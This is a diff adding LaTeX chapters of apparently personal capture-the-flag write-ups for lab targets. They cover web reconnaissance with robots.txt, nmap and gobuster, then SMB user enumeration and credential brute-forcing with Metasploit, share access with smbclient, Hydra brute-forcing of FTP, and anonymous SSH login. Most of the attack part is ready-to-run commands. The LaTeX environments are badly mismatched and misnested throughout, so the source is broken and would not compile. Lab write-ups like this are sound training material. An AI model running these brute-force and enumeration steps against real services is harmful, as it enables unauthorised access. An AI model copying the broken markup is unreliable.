@@ -1,0 +1,247 @@
+\chapter{CTF 1 --- Information Gathering}
+\label{ctf:ctf1}
+
+\begin{notebox}[Target overview]
+Black-box assessment of a web application. Goal: find all flags hidden across
+the web server using only information gathering and passive/active enumeration
+techniques.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Attack Path Overview}
+
+\begin{enumerate}
+  \item Check \ic{robots.txt} for hidden paths
+  \item Enumerate subdomains
+  \item Directory brute-force with gobuster
+  \item Look for PHP files and other entry points
+  \item Use nmap script scanning for deep discovery
+  \item Attempt login on any open service ports
+\end{enumerate}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 1 --- robots.txt}
+
+
+
+\begin{termbox}
+# Always start here
+curl http://target.ine.local/robots.txt
+\end{termbox}
+
+\begin{notebox}[Target overview]
+
+\textbf{What I found:} robots.txt listed directories the site was trying to
+hide from search engines. Flag 1 was sitting in one of those directories ---
+accessible directly in the browser without any authentication.
+
+\screenshot{assets/images/Screenshot_2026-04-11_at_10.47.32_AM.png}{robots.txt revealing hidden directories including the flag location}
+
+\begin{takebox}
+\textbf{Lesson:} robots.txt is the easiest win in web CTFs. It is literally a
+list of ``things we don't want people to find'' --- which means it is the first
+thing I look at on any web target.
+\end{takebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 2 --- nmap Script Scan}
+
+\end{notebox}
+
+\begin{termbox}
+nmap -sC -sV target.ine.local
+\end{termbox}
+
+\begin{takebox}
+
+Running the default NSE scripts revealed additional information that pointed to
+a second flag location.
+
+\screenshot{assets/images/Screenshot_2026-04-11_at_10.47.46_AM.png}{nmap -sC -sV results revealing the path to flag 2}
+
+\begin{takebox}
+\textbf{Lesson:} \ic{-sC} runs scripts that do much more than just check open
+ports. On web targets it discovers directories, enumerates common paths, and
+sometimes reveals sensitive information directly in the output.
+\end{takebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 3 --- WordPress Directory Brute-Force}
+
+\begin{termbox}
+# WordPress detected from nmap output
+gobuster dir -u http://target.ine.local/wp-content \
+  -w /usr/share/dirb/wordlists/common.txt
+\end{termbox}
+
+Gobuster found additional directories within the WordPress installation. Flag 3
+was inside one of the discovered paths.
+
+\screenshot{assets/images/Screenshot_2026-04-11_at_11.23.22_AM.png}{gobuster finding hidden WordPress directories containing flag 3}
+
+\begin{takebox}
+\textbf{Lesson:} When WordPress is detected, always brute-force \ic{/wp-content/}
+separately. The main site might look empty but plugins and uploads directories
+often contain sensitive content.
+\end{takebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flags Summary}
+
+\begin{checkbox}
+\begin{itemize}
+  \item[$\checkmark$] \textbf{Flag 1} --- Found via \ic{robots.txt}
+  \item[$\checkmark$] \textbf{Flag 2} --- Found via \ic{nmap -sC} script output
+  \item[$\checkmark$] \textbf{Flag 3} --- Found via gobuster on WordPress
+        \ic{/wp-content/}
+\end{itemize}
+\end{checkbox}
+
+\chapter{CTF 2 --- Network Enumeration \& SMB}
+\label{ctf:ctf2}
+
+\begin{notebox}[Target overview]
+Multi-flag network CTF targeting SMB, FTP, and SSH services. Each flag requires
+progressively deeper enumeration --- earlier flags leave hints for the next one.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Attack Path Overview}
+
+\begin{enumerate}
+  \item Port scan to identify open services
+  \item Enumerate SMB users and brute-force credentials
+  \item Use smbclient to access shares and retrieve flag
+  \item Follow the hint inside the flag for the next service
+  \item Brute-force FTP using a specific user list
+  \item SSH anonymous login attempt
+\end{enumerate}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 1 --- SMB Null Session and Share Access}
+
+\end{takebox}
+
+
+
+\begin{termbox}
+# Find SMB on port 445
+nmap -sV -p 445 target.ine.local
+
+# Enumerate SMB users
+msfconsole
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS target.ine.local
+run
+
+# Brute-force SMB with found users
+use auxiliary/scanner/smb/smb_login
+set RHOSTS target.ine.local
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+
+# Connect with found credentials using smbclient protocol flags
+# (SMBv2/3 required on this target)
+smbclient --option='client min protocol=SMB2' \
+          --option='client max protocol=SMB3' \
+          -L //target.ine.local -U found_user
+
+# Access the share
+smbclient --option='client min protocol=SMB2' \
+          --option='client max protocol=SMB3' \
+          //target.ine.local/share_name -U found_user
+
+# Inside smbclient:
+ls
+get flag.txt
+exit
+cat flag.txt
+\end{termbox}
+
+\begin{checkbox}
+
+\begin{takebox}
+
+\begin{notebox}[SMB protocol version flags]
+Some targets only respond to SMBv2 or SMBv3. If \ic{smbclient} connects
+without the \ic{--option} flags and the connection hangs or fails, add the
+\ic{client min/max protocol} options to force the correct version.
+\end{notebox}
+
+\screenshot{assets/images/Screenshot_2025-12-15_at_6.36.50_AM.png}{smbclient connecting with SMBv2/3 options and listing the share}
+
+\screenshot{assets/images/Screenshot_2025-12-15_at_8.13.57_AM.png}{flag.txt downloaded from SMB share}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 2 --- FTP Brute-Force Using Hint from Flag 1}
+
+Flag 1 contained a hint pointing to specific usernames related to FTP. I built
+a custom user list from the hint and brute-forced FTP.
+
+\end{takebox}
+
+\begin{termbox}
+# Create user list from names in the hint
+echo "username1" > /root/user.txt
+echo "username2" >> /root/user.txt
+
+# Brute-force FTP (note: non-standard port 5554)
+hydra -L /root/user.txt \
+      -P /root/Desktop/wordlists/unix_passwords.txt \
+      ftp://target.ine.local -s 5554
+
+# Login with found credentials
+ftp target.ine.local 5554
+# Enter username and password at prompt
+ls
+get flag2.txt
+exit
+cat flag2.txt
+\end{termbox}
+
+\begin{notebox}[SMB protocol version flags]
+
+\begin{notebox}
+FTP may not respond immediately after Hydra finishes brute-forcing. The service
+rate-limits connections briefly. Wait a moment before manually connecting.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flag 3 --- SSH Anonymous Login}
+
+\begin{termbox}
+# SSH was visible on port 22 from initial scan
+# Brute-force attempt failed --- too many attempts or lockout
+
+# Try anonymous login
+ssh anonymous@target.ine.local
+
+# Flag was embedded in the SSH warning/banner message displayed on login
+\end{termbox}
+
+The flag was inside the SSH warning message displayed when logging in. No
+authentication required for the anonymous account --- the flag was literally
+in the banner.
+
+\begin{takebox}
+\textbf{Lesson:} When brute-force fails on SSH, try \ic{anonymous} login.
+Some systems display a banner with a message before authenticating, and in
+CTFs that message sometimes contains the flag or a useful hint.
+\end{takebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section*{Flags Summary}
+
+\begin{checkbox}
+\begin{itemize}
+  \item[$\checkmark$] \textbf{Flag 1} --- SMB share access with brute-forced credentials
+  \item[$\checkmark$] \textbf{Flag 2} --- FTP brute-force using hint from flag 1
+        (non-standard port 5554)
+  \item[$\checkmark$] \textbf{Flag 3} --- SSH anonymous login banner message
+\end{itemize}
+\end{checkbox}
+
+\end{notebox}
+\end{checkbox}
